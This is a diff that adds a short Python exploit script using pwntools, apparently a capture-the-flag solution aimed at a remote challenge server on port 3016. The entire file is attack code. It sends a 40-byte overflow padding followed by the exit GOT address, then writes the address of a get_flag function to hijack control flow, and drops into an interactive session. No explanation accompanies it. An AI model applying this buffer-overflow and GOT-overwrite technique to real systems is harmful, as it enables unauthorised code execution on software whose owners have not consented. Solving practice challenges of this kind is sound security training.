@@ -1,0 +1,20 @@
+from pwn import *
+
+p = remote("ctf.j0n9hyun.xyz", 3016)
+
+
+get_flag = 0x400826
+
+exit_got = 0x601068
+payload = b"a" * 40
+payload += p64(exit_got)
+
+p.sendline(payload)
+
+payload = p64(get_flag)
+p.sendline(payload)
+
+p.interactive()
+
+
+
